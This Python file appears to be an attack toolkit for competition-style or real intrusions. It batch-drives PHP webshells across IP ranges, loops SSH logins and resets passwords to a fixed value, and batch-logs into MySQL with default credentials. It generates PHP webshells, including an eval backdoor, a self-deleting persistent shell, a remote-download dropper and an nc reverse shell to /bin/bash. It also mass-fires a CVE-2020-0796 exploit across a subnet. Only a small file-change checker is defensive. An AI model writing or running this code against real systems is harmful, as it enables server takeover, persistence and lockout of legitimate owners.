from paramiko import SSHClient
from paramiko import AutoAddPolicy
import hashlib
import threading
import requests
import hashlib
import time
import os
import pymysql
#作者:破壳雏鸟
#联系信息:nonename@qq.com
#encoding:utf-8
#版本:3.0
#提示:欢迎您对本模块进行指正和指导，您的支持就是我们前进的动力

#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#ssh的基础模块
class SSH:
    def __init__(self):
        self.client=SSHClient()#实例化一个对象
        self.client.set_missing_host_key_policy(AutoAddPolicy())#避免在ssh连接时需要输入yes
    def ssh_Connect(self,hostname,username,pwd,cmd,port):
        try:
            self.client.connect(hostname=hostname,username=username,password=pwd,port=port,timeout=5)#获取用户输入的信息并且连接远程主机
            stdin,stdout,stderr=self.client.exec_command(cmd)#获取要执行的命令
            rst = stdout.read().decode('utf-8')# 输出结果
            self.client.close()#关闭ssh对象            
            print(hostname+":"+port+"命令执行结果：\n----->\n"+rst+"\n<-----")#输出执行结果
        except:
            print("连接失败："+hostname+":"+port)#输出错误
    def ssh_Mod_Pwd(self,hostname,username,pwd,cmd,port):
        try:
            self.client.connect(hostname=hostname,username=username,password=pwd,port=port,timeout=5)#获取用户输入的信息并且连接远程主机
            stdin,stdout,stderr=self.client.exec_command("passwd")#获取要执行的命令
            stdin.write("%s\npkcn2021.com\npkcn2021.com\n" % pwd)
            rst = stdout.read().decode('utf-8')# 输出结果
            self.client.close()#关闭ssh对象            
            if "successfully" in rst:
                print(hostname+":"+port+"密码修改成功！ 默认修改的密码为  pkcn2021.com")#输出执行结果
        except:
            print("连接失败："+hostname+":"+port)#输出错误
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#http请求的基础模块
class HttpRqt:
    def __init__(self):
        self.nothing=1
    def get_Req(self, url, header=''):#GET方法
        try:
            rst=requests.get(url, headers=header, timeout=2)#发送请求
            if rst.status_code == requests.codes.ok:#判断连接的状态码
                print(url+" 命令执行结果：\n----->\n"+rst.text+"\n<-----")#输出执行结果
        except:
            print("连接失败："+url)

    def post_Req(self, url, data):#POST模块
        try:
            rst=requests.post(url=url,data=data, timeout=2)#发送请求
            if rst.status_code == requests.codes.ok:#判断请求状态码
                print(url+" 命令执行结果：\n----->\n"+rst.text+"\n<-----")#输出执行结果
        except:          
            print("连接失败："+url)
#----------------------------------------------------------------------------------------------------------------------------------------------------------------------
#处理数据文件
class DealForFile:
    def __init__(self) -> None:
        self.ip_list=[]
        self.port_list=[]
        self.trojan_list=[]
        self.cmd_input=''
        self.pwd=''
        self.command=''
        self.med=''
    def web_File(self,filename):
        data=open(filename,"r",encoding="utf-8")
        #将data.txt的内容进行格式处理
        while 1:
            ip=data.readline()
            if not ip:
                break
            rst=ip.split('@')
            rst2=rst[0]
            if rst2=='ip':
                ip=rst[1].split('\n')
                if "$" in ip[0]:#获取IP地址列表
                    list_ip = ip[0].split('.')
                    for i in list_ip:
                        if "$" in i :
                            index_target = list_ip.index(i)
                            deal1 = i.split('$')
                    if "-" in deal1[1]:
                       deal2 = deal1[1].split("-")
                       for i in range(int(deal2[0]),int(deal2[1])+1):
                           list_ip[index_target] = str(i)
                           self.ip_list.append(list_ip[0]+"."+list_ip[1]+"."+list_ip[2]+"."+list_ip[3])
                else:
                    self.ip_list.append(ip[0])
            if rst2=='port':
               port=rst[1].split('\n')
               self.port_list.append(port[0])#获取端口号列表
            if rst2=='trojan':
               trojan=rst[1].split('\n')
               self.trojan_list.append(trojan[0])#获取木马地址
            if rst2=='cmd':
               cmd=rst[1].split('\n')
               self.cmd_input=cmd[0]#获取要执行的命令
            if rst2=='method':
               method=rst[1].split('\n')
               self.med=method[0]#获取发送数据的方法
            if rst2=='passwd':
               passwd=rst[1].split('\n')
               self.pwd=passwd[0]#获取木马的连接密码
        data.close()
        return {"ip":self.ip_list,"port":self.port_list,"trojan":self.trojan_list,"cmd":self.cmd_input,"passwd":self.pwd,"med":self.med}#返回一段字典数据
    def ssh_File(self,filename):
        data=open(filename,'r',encoding="utf-8")
        while 1:
            data_=data.readline()
            if not data_:
                break
            try:
                rst=data_.split('@')
                rst2=rst[0]
                if rst2=='ip':#获取IP地址列表
                    ip=rst[1].split('\n')
                    if "$" in ip[0]:
                        list_ip = ip[0].split('.')
                        for i in list_ip:
                            if "$" in i :
                                index_target = list_ip.index(i)
                                deal1 = i.split('$')
                        if "-" in deal1[1]:
                           deal2 = deal1[1].split("-")
                           for i in range(int(deal2[0]),int(deal2[1])+1):
                               list_ip[index_target] = str(i)
                               self.ip_list.append(list_ip[0]+"."+list_ip[1]+"."+list_ip[2]+"."+list_ip[3])
                    else:
                        self.ip_list.append(ip[0])

                if rst2=='port':
                   port=rst[1].split('\n')
                   self.port_list.append(port[0])#获取端口号列表
                if rst2=='passwd':
                   passwd=rst[1].split('\n')
                   pwd=passwd[0]#获取默认密码
                if rst2=='cmd':
                   cmd=rst[1].split('\n')
                   command=cmd[0]#获取要执行的命令
                if rst2=='user':
                   users=rst[1].split('\n')
                   usr=users[0]#获取默认用户名
            except:
                print("文件格式错误！")
                return None
        data.close()
        return {"ip":self.ip_list,"port":self.port_list,"passwd":pwd,"cmd":command,"user":usr}#返回字典数据
    def sql_File(self,filename):
        data=open(filename,'r',encoding="utf-8")
        while 1:
            data_=data.readline()
            if not data_:
                break
            rst=data_.split('@')
            rst2=rst[0]
            if rst2=='ip':#获取IP地址列表
                ip=rst[1].split('\n')
                if "$" in ip[0]:
                    list_ip = ip[0].split('.')
                    for i in list_ip:
                        if "$" in i :
                            index_target = list_ip.index(i)
                            deal1 = i.split('$')
                    if "-" in deal1[1]:
                       deal2 = deal1[1].split("-")
                       for i in range(int(deal2[0]),int(deal2[1])+1):
                           list_ip[index_target] = str(i)
                           self.ip_list.append(list_ip[0]+"."+list_ip[1]+"."+list_ip[2]+"."+list_ip[3])
                else:
                    self.ip_list.append(ip[0])
            if rst2=='passwd':
               passwd=rst[1].split('\n')
               self.pwd=passwd[0]#获取默认密码
            if rst2=='sql':
               sql=rst[1].split('\n')
               sql_Data=sql[0]#获取要执行的SQL语句
            if rst2=='user':
               users=rst[1].split('\n')
               usr=users[0]#获取默认用户名
            if rst2 == 'dbname':
                dbData = rst[1].split('\n')
                dbname = dbData[0]#获取要连接的数据库
        data.close()
        return {"ip":self.ip_list,"passwd":self.pwd,"sql":sql_Data,"user":usr,"dbname":dbname}#返回字典数据
    def cve_File(self,filename):
        data=open(filename,'r',encoding="utf-8")
        while 1:
            data_=data.readline()
            if not data_:
                break
            rst=data_.split('@')
            rst2=rst[0]
            if rst2=='ip':
               ip=rst[1].split('\n')
               self.ip_list.append(ip[0])#获取IP地址列表
        return self.ip_list
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#web木马测试模块
class WebHack:
    def __init__(self) -> None:
        self.request = HttpRqt()
        self.dealFile = DealForFile()
    def getCmd(self):#GET微型木马连接器
       print('欢迎使用GET方式连接木马模块！！！')
       print("\n")
       url=input("请输入目标网站的URL链接(记得加冒号端口哦！):")#获取用户输入URL
       pas=input('请输入PHP木马的连接密码:')#获取木马的连接密码
       cmd=input('请输入要执行的命令:')#获取要执行的命令
       url=url+'?'+pas+"="#拼接链接
       while 1:
           self.request.get_Req(url+cmd)#调用get请求方法发送请求
           cmd=input("请输入要执行的命令:")#获取用户输入的命令
           if cmd == "exit":#如果用户输入exit则退出
               break
    def postCmd(self):#POST微型木马连接器
        print("欢迎使用POST方式连接木马模块！！！")
        print("\n")
        url=input("请输入目标URL地址（不要忘记端口哦！！！）:")#获取用户输入的URL
        passwd=input("请输入PHP木马的密码：")#获取用户输入木马密码
        data={passwd:input("请输入要执行的命令:")}#获取用户输入的命令
        while 1:
            self.request.post_Req(url, data=data)#调用POST基础模块发送请求
            data={passwd:input('请输入要执行的命令:')}#获取用户输入的命令
            if data == {passwd:"exit"}:
                break
    def reqBatchSend(self,data):
        urlhead=[] #用来存储初始URL数据
        target_list=[]#用来存储目标数据
        data_File = data#获取文件处理方法返回的数据
        med = data_File['med']
        ip_list = data_File['ip']
        port_list = data_File['port']
        trojan_list = data_File['trojan']
        pwd = data_File['passwd']
        cmd = data_File['cmd']
        if med=='get':#使用GET的方式发送数据
            for i in ip_list:
                for i2 in port_list:
                    urlhead.append("http://"+i+":"+i2) #获取URL和端口
            for i in urlhead:
                for i2 in trojan_list:
                    target_list.append(i+i2+"?"+pwd+"="+cmd)#获取完整的目标URL
            for i in target_list:
                t=threading.Thread(target=self.request.get_Req,args=(i,)) 
                t.start()#使用多线程发包
        if med=='post':#使用POST方式发送数据
            for i in ip_list:
                for i2 in port_list:
                    urlhead.append("http://"+i+":"+i2)#获取初始URL
            for i in urlhead:
                for i2 in trojan_list:
                    target_list.append(i+i2)#获取完整URL
            for i in target_list:
                t=threading.Thread(target=self.request.post_Req,args=(i, {pwd:cmd}))
                t.start()#使用多线程发包
    def reqBatch(self,filename):
        data_File = self.dealFile.web_File(filename)
        try:
            while 1:
                self.reqBatchSend(data_File)
                print("当前循环执行时间："+time.strftime("%H:%M:%S", time.localtime()))
                time.sleep(180)#让解析器停止3分钟
                os.system("clear")#此方式是用来清屏的，只适用于linux，Windows请改为cls              
        except:
            print("用户退出")
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#ssh弱密码测试模块
class SshHack:
    def __init__(self) -> None:
        self.sshconn = SSH()#实例化一个ssh对象
        self.dealFile = DealForFile()#实例化一个文件格式处理对象
    def sshSend(self,ip_list,port_list,pwd,usr,command):
        if command:
            for i in ip_list:#获取所有IP地址
                for i2 in port_list:#获取所有端口号
                    self.sshconn.ssh_Connect(i,usr,pwd,command,i2)
        else:
            for i in ip_list:#获取所有IP地址
                for i2 in port_list:#获取所有端口号
                    self.sshconn.ssh_Mod_Pwd(i,usr,pwd,'',i2)
                
    def sshBatch(self,filename):
        data_File = self.dealFile.ssh_File(filename)#调用文件处理对象的方法来处理数据文件
        try:
            while 1:
                self.sshSend(data_File['ip'], data_File['port'], data_File['passwd'], data_File['user'], data_File['cmd'])#调用发送方法
                print("当前循环执行时间："+time.strftime("%H:%M:%S", time.localtime()))
                time.sleep(180)#让解析器停止3分钟
                os.system("clear")#此方式是用来清屏的，只适用于linux,Windows请改为cls                
        except:
            print("用户退出")
#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#mysql弱密码测试模块
class MysqlCon:
    def __init__(self) -> None:
        self.dealFile = DealForFile()#实例化一个用来处理文件数据的对象
    def mySqlBase(self,hostip,username,passwd,dbname,sql):#声明基础的mysql连接方法
        try:
            db = pymysql.connect(host = hostip, user = username, password = passwd, database = dbname)#Python3.7及以上的填写参数
            cursor = db.cursor()#声明一个游标对象
            cursor.execute(sql)#执行语句
            data = cursor.fetchall()#获取所有返回结果
            print("来自"+hostip+"的回复："+data[0][0])#返回结果是一个二维元组
            db.close()#关闭对象
            cursor.close()#关闭对象
        except:
            print(hostip+"连接失败！")
    def mysqlBatchSend(self, data):
        for i in data['ip']:#获取IP地址并填充
            t = threading.Thread(target = self.mySqlBase, args=(i, data['user'], data['passwd'], data['dbname'], data['sql']))#通过多线程发包
            t.start()#启动该线程
    def mysqlBatch(self,filename):#声明执行批量连接的方法
        data_File = self.dealFile.sql_File(filename)#获取数据文件里的数据，并返回一个字典
        #执行批量程序
        try:
            while 1:
                self.mysqlBatchSend(data_File)
                print("当前循环执行时间："+time.strftime("%H:%M:%S", time.localtime()))
                time.sleep(180)
                os.system("clear")
        except:
            print("用户退出")

#------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#木马生成模块
class Tro_horse:
    def __init__(self,path='./'):
        self.path_data=path#获取生成木马的路径
    def php_horse(self):
        name=input("请输入要生成的木马文件名:")
        passwd=input('请输入密码:')
        hash=hashlib.md5()#创建一个MD5对象
        hash.update(passwd.encode(encoding='utf-8'))#把用户输入的密码变成MD5值
        passwd2=hash.hexdigest()#获取生成的MD5值
        print("""
        *本程序生成的木马的连接密钥统一为cmd
        *连接演示:http://xxx.xxx.xxx.xxx/example.php?passwd=(你开头输入的密码)&cmd=(你要执行的命令)
        _____________________________________________________________________________
        |1---生成普通木马                                                              |
        |2---生成不死马                                                                |
        |3---生成远端下载木马                                                           |
        |4---生成nc回连木马                                                            |
        |____________________________________________________________________________|
        
        
        
        
        
        """)
        opt=int(input('请根据需要输入你需要的木马:'))#获取用户输入的木马代号
        if opt == 1:
        
            shellcode="<?php if(md5($_GET['passwd'])=='"+passwd2+"'){eval($_REQUEST['pkcn']);} ?>"#这是一个简单的一句话木马
        if opt == 2:
            print("*不死马生成的木马名为.phpini.php")
            passwd3=r'"'+passwd2+r'"'
            shell=r"'<?php if(md5($_GET[passwd])=="+passwd3+r"){eval($_REQUEST[cmd]);}?>'"
            shellcode=r'<?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);while(1){$content='+shell+r';file_put_contents(".phpini.php",$content'+r');usleep(50);}?>'#这是一个简单内存木马
            
        if opt == 3:
            user=input('请输入您的服务器文件地址，请把木马文件设为txt:')
            name2=input('请输入远端下载后生成的文件名:')
            shellcode=r"<?php $content=file_get_contents('"+user+r"');file_put_contents('"+name2+r"',$content);?>"#这是一个远程下载文件木马
        if opt == 4:
            rhost=input('请输入您本机的ip地址:')
            rport=input('请输入您要回连的端口:')
            shell="'nc -v "+rhost+" "+rport+" -e /bin/bash'"
            shellcode=r"<?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);while(1){ system("+shell+r"); usleep(120000000);}?>"#这是一个NC回连木马
            print("请先在本机执行命令:nc -nlvp "+rport+",并等待木马运行后回连，木马每两分钟发起一次回连！！！")
        try:
            with open(self.path_data+name,"w") as obj:
                obj.write(shellcode)#将木马写到对应文件中去
        except:
            print("请确保当前路径正确和存在！")
        else:
            print("木马在"+self.path_data+"目录下成功生成!")#输出提示        
#-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#针对windows10-1909攻击模块
class PocAttack:
    def __init__(self) -> None:
        self.dealFile = DealForFile()
        self.data_Target = []
    def cve_0796(self,target):
        try:
            os.system("./POC/CVE-2020-0796/CVE-2020-0796.py "+target)
        except:
            print(target+"攻击失败！")
    def cve_send(self):
        target = input("请输入目标网段(x.x.x.0):")
        data = target.split(".")
        counter = 1
        target_Ip = ''
        for i in data:
            if counter == 4:
                break
            target_Ip += i+"."
            counter += 1
        counter = 1
        while 1:
            if counter > 255:
                break
            self.data_Target.append(target_Ip+str(counter))
            counter += 1
        for i in self.data_Target:
            t = threading.Thread(target=self.cve_0796,args=(i,))
            t.start()
#-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#此模块是用来做文件检测的
class FileCheck:
    def __init__(self) -> None:
        self.ok = True
        self.path_list=[]
    def fileCheck(self):#此方法是用来检测新增文件的
        input_path=input("请输入目标文件夹路径：")
        opt=input("是否为第一次运行(yes/no)：")
        if opt=='yes':
            fp=open('./data/filecheck/path.txt','w')
            for root,dirs,files in os.walk(input_path):
                for i in files:
                    path=os.path.join(root,i)
                    with open('./data/filecheck/path.txt','a') as fp:
                        fp.write(path+"\n")
            fp.close()
            print("文件结构信息已记录到  ./data/filecheck/path.txt  文件下！")
            #self.fileMd5Check(input_path,opt)
            return 0
    
        fp_get_local_file=open('./data/filecheck/path.txt','r')
        while 1:
            path=fp_get_local_file.readline()
            if path:
                path_data=path.split('\n')
                self.path_list.append(path_data[0])
            else:
                break
        fp_get_local_file.close()
        for root,dirs,files in os.walk(input_path):
            for i in files:
                path=os.path.join(root,i)
                if path in self.path_list:
                    continue
                else:
                    self.ok = False
                    print("异常文件---->>"+path)
                    with open('./data/filecheck/file_log.txt','a') as fp:
                        fp.write("dangerous file---->>"+path+"\n")
        if self.ok:
            print("暂未检测到新增文件")
            #self.fileMd5Check(input_path, opt)
        return 0

    #def fileMd5Check(self,input_path,old_path,opt):#此方法用来检测文件的md5值，从而检测文件是否被修改
    #    #if opt=='yes':
    #    #    fp=open('./data/filecheck/filemd5.txt','w')
    #    #    for root,dirs,files in os.walk(old_path):
    #    #        for i in files:
    #    #            path=os.path.join(root,i)
    #    #            with open(path,"r",encoding='utf-8') as fp_read:
    #    #                fp.write(hashlib.md5(fp_read.read().encode(encoding='utf-8')).hexdigest()+"\n")
    #    #    fp.close()
    #    #    print("文件md5信息已被存储到  ./data/filecheck/filemd5.txt  下")
    #    #    return 0
    #    #else:
    #    file_list = []
    #    fp = open(old_path,'r')
    #    while 1:
    #        data = fp.readline().split('\n')[0]
    #        if data:
    #            file_list.append(data)
    #        else:
    #            break
    #    fp.close()
    #    fp = open('./data/filecheck/filecontent_log.txt','w')
    #    for root,dirs,files in os.walk(input_path):
    #        for i in files:
    #            path=os.path.join(root,i)
    #            with open(path,"r",encoding='utf-8') as fp_read:
    #                if  in file_list:
    #                    continue
    #                else:
    #                    self.ok = False
    #                    print("异常文件---》"+path)
    #                    fp.write("异常文件---》"+path)
    #    fp.close()
    #    if self.ok:
    #        print("暂未发现被修改文件")
    #    return 0